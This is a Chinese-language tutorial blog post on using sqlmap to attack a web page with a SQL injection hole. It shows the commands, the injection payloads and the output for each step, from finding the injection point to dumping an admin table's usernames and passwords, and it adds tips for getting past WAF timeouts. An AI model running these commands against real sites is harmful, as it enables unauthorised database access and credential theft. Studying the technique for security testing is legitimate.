---
title: Net(5)——sqlmap使用实例
date: 2020-11-21
author: LM
---

## 1.第一步：查找注入点

```bash
sqlmap -u '192.168.3.59/article.php?id=1' #必须带上GET参数，否则sqlmap不知道如何注入
```

```bash
root@kali:~# sqlmap -u '192.168.3.59/article.php?id=1'
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.1.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 11:30:43

[11:30:43] [INFO] resuming back-end DBMS 'mysql' 
[11:30:43] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1817=1817

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-2184 UNION ALL SELECT NULL,CONCAT(0x716b707071,0x517964767671746351415543654b4b794171664b78754b57434b70774c6b56434b6a46786a4d5a76,0x717a706271)-- BgjA
---
[11:30:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:30:43] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.3.59'

[*] shutting down at 11:30:43
```

**结果：**出现Parameter: id (GET)等内容，存在注入点

## 2.第二步：查找数据库

```bash
sqlmap -u '192.168.3.59/article.php?id=1' --dbs    #查找数据库
```

```bash
#........#
[11:37:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:37:43] [INFO] fetching database names
[11:37:43] [INFO] the SQL query used returns 2 entries
[11:37:43] [INFO] retrieved: information_schema
[11:37:43] [INFO] retrieved: website
available databases [2]:                                                       
[*] information_schema
[*] website
#......#
```

**结果：**注入发现两个数据库information_schema和website。information_schema主要是mysql数据库、表、列的信息，没有什么用处，website是网站的数据，对这个数据库进行注入。

## 3.第三步：注入

```bash
sqlmap -u '192.168.3.59/article.php?id=1' -D website --tables  #对website表注入
```

```bash
#。。。。。#
[11:41:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:41:14] [INFO] fetching tables for database: 'website'
[11:41:14] [INFO] the SQL query used returns 2 entries
[11:41:14] [INFO] retrieved: admin
[11:41:14] [INFO] retrieved: articles
Database: website                                                              
[2 tables]
+----------+
| admin    |
| articles |
+----------+
#..........#
```

**结果：**发现有两张表admin、articles，选择注入admin

## 4.第四步：读取数据

```bash
sqlmap -u '192.168.3.59/article.php?id=1' -D website -T admin --columns  #读取admin表中列
```

```bash
#..............#
[11:43:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:43:46] [INFO] fetching columns for table 'admin' in database 'website'
[11:43:47] [INFO] the SQL query used returns 3 entries
[11:43:47] [INFO] retrieved: "id","int(11)"
[11:43:47] [INFO] retrieved: "user","text"
[11:43:47] [INFO] retrieved: "pass","text"
Database: website                                                              
Table: admin
[3 columns]
+--------+---------+
| Column | Type    |
+--------+---------+
| user   | text    |
| id     | int(11) |
| pass   | text    |
+--------+---------+
#............#
```

**结果：**注入得到了三列user、id、pass，只要得到user和pass，就能得到密码(一般是网站后台管理的登录密码)

## 5.第五步：查看数据

```bash
sqlmap -u '192.168.3.59/article.php?id=1' -D website -T admin -C user,pass --dump #将uesr，pass数据输出
```

```bash
#..........#
[11:47:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:47:33] [INFO] fetching entries of column(s) '`user`, pass' for table 'admin' in database 'website'
[11:47:33] [INFO] the SQL query used returns 3 entries
[11:47:33] [INFO] retrieved: "test1","123456"
[11:47:33] [INFO] retrieved: "test2","123456"
[11:47:33] [INFO] retrieved: "test3","123456"
Database: website                                                              
Table: admin
[3 entries]
+--------+--------+
| user   | pass   |
+--------+--------+
| test1  | 123456 |
| test2  | 123456 |
| test3  | 123456 |
+--------+--------+
#............#
```

**结果：**可以查看到用户名与密码

## 6.尝试一下

```bash
sqlmap -u "192.168.1.188/vprproject/index.php/Home/Video/index/id/189*" --batch -D test_vprctrl -T adminer --dump

sqlmap -u "192.168.1.188/vprproject/index.php/Home/Video/index/id/189*" --batch -D test_vprctrl -T adminer -columns 

sqlmap -u "192.168.1.188/vprproject/index.php/Home/Video/index/id/189*" --batch -D test_vprctrl --tables

sqlmap -u "192.168.1.188/vprproject/index.php/Home/Video/index/id/189*" --batch -D test_vprctrl --dump-all

sqlmap -u "192.168.1.188/vprproject/index.php/Home/Video/index/id/189*" --batch --dbs

sqlmap -u "192.168.1.188/vprproject/index.php/Home/Video/index/id/189*" --batch
```

## 7.常见报错

**Q：有时发现跑出的数据都是毫无意义的字符**

**A：解决方案**

- SQLMAP会提示你加–hex或者–no-cast，有时会有帮助
- 如果你用的是time-based注射，建议增加延时–time-sec等参数，即使你的网速比较好，但是服务器可能遇见各种奇怪环境
- 增加level的数值

**Q：显示unable to connect to the target url**

**A：解决方案**

第一个可能是 time-out 设置的太小，出现问题，再有可能就是 waf 直接把请求拦截掉了，因此得不到响应。有些 waf 比较友善，过滤后会提示“参数不合法”，但是也有些waf则直接把请求拦下来无提示导致应答超时，这样在测试时会消耗大量的时间等待响应，建议减少time-out进行检测，在跑数据时改回time-out

**Q：提示possible integer casting detected**

**A：解决方案**

如果是在手工测试，建议到这里可以停止了，节省时间。如果是在扫描器扫描的盲注，那么到这里坚决无视警告继续下去。



